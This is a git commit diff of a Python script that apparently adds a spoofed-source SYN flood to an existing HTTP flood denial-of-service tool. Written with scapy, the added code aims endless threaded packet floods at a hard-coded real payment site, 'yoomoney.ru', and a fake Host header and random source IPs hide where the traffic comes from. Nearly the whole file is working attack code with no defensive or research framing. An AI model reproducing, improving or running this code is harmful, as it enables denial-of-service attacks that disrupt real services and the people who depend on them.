8b628610fcb11719c00f96d014da9b6824413c44
1-off <97915378+1-off@users.noreply.github.com>
2022-03-02 12:59:04 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,28 +1,41 @@
-
 import socket
 import threading
+from random import randint
+from scapy.all import *
 
-def find_ip(hostname:str) ->str:
+
+def find_ip(hostname: str) -> str:
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
     return ip
 
-# if you have an hostname use target_ip = find_ip("badguys.ru")
-target_ip = ''
-# you can change to anything you want
+
+def randomIP():
+    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+    return ip
+
+
+def randomPort():
+    return randint(1000, 9000)
+
+
+target_ip = 'yoomoney.ru'
 fake_ip = '217.107.219.57'
 # port can be 443 or 80 check if the website has https
 port = 443
 # check before how many cores you have and use about 25% of max thread available
-max_threads = 5
+max_threads = 1
+raw = Raw(b"X" * 1024)
 
-#this is a counter 
+# this is a counter
 attack_num = 0
-def attack():
+
+
+def standard_attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_ip, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
+        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
 
         global attack_num
@@ -30,11 +43,34 @@ def attack():
         print(attack_num)
 
         s.close()
-        
-def initiate():
+
+
+def syn_attack():
+    total = 0
+
+    while True:
+        # forge IP packet with target ip as the destination IP address
+        IP_Packet = IP()
+        IP_Packet.src = randomIP()
+        IP_Packet.dst = target_ip
+
+        # Let's forge our TCP layer:
+        TCP_Packet = TCP()
+        TCP_Packet.sport = randomPort()
+        TCP_Packet.dport = port
+        TCP_Packet.flags = "S"
+        TCP_Packet.seq = randomPort()
+        TCP_Packet.window = randomPort()
+
+        send(IP_Packet / TCP_Packet / raw, verbose=0)
+        total += 1
+        print(f"{total} bayraktar")
+
+def initiate(attack_type):
     for i in range(max_threads):
-        thread = threading.Thread(target=attack)
+        thread = threading.Thread(target=attack_type)
         thread.start()
-        
+
+
 if __name__ == "__main__":
-    initiate()
+    syn_attack()
